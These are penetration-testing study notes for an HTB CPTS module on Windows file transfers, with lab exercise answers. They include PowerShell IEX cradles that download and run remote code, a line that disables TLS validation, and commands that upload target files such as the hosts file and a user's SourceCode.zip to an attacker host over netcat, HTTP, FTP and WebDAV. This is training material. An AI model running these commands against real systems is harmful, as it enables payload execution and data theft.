### CPTS / HTB Penetration Tester Path <br>
### File Transfers - Windows <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Windows File Transfers (Full)



Windows ships with multiple file transfer paths attackers can abuse. Many "fileless" attacks (e.g. Microsoft's Astaroth APT writeup) chain native binaries — `WMIC` /Format → JavaScript → `Bitsadmin` → `Certutil` → `regsvr32` — to download / decode / execute payloads without dropping a binary directly.

PowerShell base64 (no network) — encode on attacker, paste into target shell, decode to disk. Verify with md5/Get-FileHash.

Encode on Pwnbox:

```diff
+ $ md5sum id_rsa
+ $ cat id_rsa | base64 -w 0; echo
```

Decode on Windows target:

```diff
+ PS> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<b64>"))
+ PS> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

Note: cmd.exe maxes at 8,191 chars per line — large files won't fit through this method.

PowerShell web download (HTTP/S/FTP via `System.Net.WebClient`):

```diff
+ PS> (New-Object Net.WebClient).DownloadFile('<url>','<out>')
+ PS> (New-Object Net.WebClient).DownloadFileAsync('<url>','<out>')
```

Fileless `IEX` cradle (run in memory, no disk write):

```diff
+ PS> IEX (New-Object Net.WebClient).DownloadString('<url>')
+ PS> (New-Object Net.WebClient).DownloadString('<url>') | IEX
```

`Invoke-WebRequest` (PS 3.0+, slower; aliases `iwr`/`curl`/`wget`):

```diff
+ PS> Invoke-WebRequest <url> -OutFile <name>
```

Common errors:

- IE first-launch not done → use `-UseBasicParsing`.
- SSL/TLS trust failure → `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`.

| Method | Hits Disk | Notes |
|---|---|---|
| `WebClient.DownloadFile` | yes | Fastest |
| `WebClient.DownloadString \| IEX` | no | Fileless |
| `Invoke-WebRequest -OutFile` | yes | Slower |
| `Invoke-WebRequest \| IEX` | no | Use `-UseBasicParsing` |

SMB downloads — set up `impacket-smbserver` on attacker (TCP/445):

```diff
+ $ sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Pull file from share on target:

```diff
+ C:\> copy \\<attacker_ip>\share\nc.exe
```

New Windows blocks unauth guest SMB. Use auth'd share + `net use`:

```diff
+ $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```diff
+ C:\> net use n: \\<attacker_ip>\share /user:test test
+ C:\> copy n:\nc.exe
```

FTP downloads — `pyftpdlib` (port 2121 default, override with `--port 21`, anon by default):

```diff
+ $ sudo pip3 install pyftpdlib
+ $ sudo python3 -m pyftpdlib --port 21
```

PowerShell pull:

```diff
+ PS> (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt','C:\Users\Public\ftp-file.txt')
```

Non-interactive shell — script the FTP client with a command file:

```diff
+ C:\> echo open <attacker_ip> > ftpcommand.txt
+ C:\> echo USER anonymous >> ftpcommand.txt
+ C:\> echo binary >> ftpcommand.txt
+ C:\> echo GET file.txt >> ftpcommand.txt
+ C:\> echo bye >> ftpcommand.txt
+ C:\> ftp -v -n -s:ftpcommand.txt
```

Upload — base64 encode file on Windows, decode on attacker:

```diff
+ PS> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+ PS> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

```diff
+ $ echo <b64> | base64 -d > hosts
+ $ md5sum hosts
```

PowerShell web upload — Python `uploadserver` module accepts POSTs:

```diff
+ $ pip3 install uploadserver
+ $ python3 -m uploadserver
```

Use `PSUpload.ps1` (calls `Invoke-RestMethod`):

```diff
+ PS> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+ PS> Invoke-FileUpload -Uri http://<attacker>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

Base64 + netcat upload (no upload server needed):

```diff
+ PS> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+ PS> Invoke-WebRequest -Uri http://<attacker>:8000/ -Method POST -Body $b64
```

Catch with nc, decode:

```diff
+ $ nc -lvnp 8000
+ $ echo <b64> | base64 -d -w 0 > hosts
```

SMB upload via WebDAV — when SMB/445 outbound is blocked but HTTP is not, run SMB-over-HTTP with `wsgidav`:

```diff
+ $ sudo pip3 install wsgidav cheroot
+ $ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

Connect from Windows using `DavWWWRoot` keyword (or named share):

```diff
+ C:\> dir \\<attacker_ip>\DavWWWRoot
+ C:\> copy C:\Users\john\Desktop\SourceCode.zip \\<attacker_ip>\DavWWWRoot\
+ C:\> copy C:\Users\john\Desktop\SourceCode.zip \\<attacker_ip>\sharefolder\
```

If TCP/445 isn't restricted, plain `impacket-smbserver` works the same as for downloads.

FTP upload — start `pyftpdlib` with `--write`:

```diff
+ $ sudo python3 -m pyftpdlib --port 21 --write
```

PowerShell push:

```diff
+ PS> (New-Object Net.WebClient).UploadFile('ftp://<attacker>/ftp-hosts','C:\Windows\System32\drivers\etc\hosts')
```

FTP command file for non-interactive shells:

```diff
+ C:\> echo open <attacker_ip> > ftpcommand.txt
+ C:\> echo USER anonymous >> ftpcommand.txt
+ C:\> echo binary >> ftpcommand.txt
+ C:\> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+ C:\> echo bye >> ftpcommand.txt
+ C:\> ftp -v -n -s:ftpcommand.txt
```

<br>

---

<br>

### Windows File Transfer Exercise

IP: 10.129.21.58

---

### Question 1:
Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.

#### Wget straight from the target's web root:

```diff
+ $ wget http://10.129.21.58/flag.txt
```

&#x1F6A9; found **b1a4ca91828--edit--cd96004565521944a3b**.

---

### Question 2:
Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.

#### Base64 encode the zip on the Pwnbox:

```diff
+ $ base64 -w 0 upload_win.zip
```

	UEsDBAoAAAAAAFmEKVFHXocmIAAAACAAAAAOAAAAdXBsb2FkX3dpbi50eHRlNGZlZWM0NjZkNWRlNzAxMDg5YjVjYzFiZjZkNTkyYVBLAQI/AAoAAAAAAFmEKVFHXocmIAAAACAAAAAOACQAAAAAAAAAIAAAAAAAAAB1cGxvYWRfd2luLnR4dAoAIAAAAAAAAQAYAHjm8KnohtYBzETj5fqG1gEXkIab6IbWAVBLBQYAAAAAAQABAGAAAABMAAAAAAA=

#### Drop the b64 string into a text file on the Windows target (`zip64.txt`), read it back into PS, decode, write the zip:

```diff
+ PS> $b64 = Get-Content -Path "C:\Users\htb-student\zip64.txt" -Raw
+ PS> $bytes = [Convert]::FromBase64String($b64)
+ PS> [IO.File]::WriteAllBytes("C:\Users\htb-student\upload_win.zip", $bytes)
```

#### Extract and hash:

```diff
+ PS> hasher upload_win.txt
```

&#x1F6A9; found **e4feec46--edit--de701089b5cc1bf6d592a**.
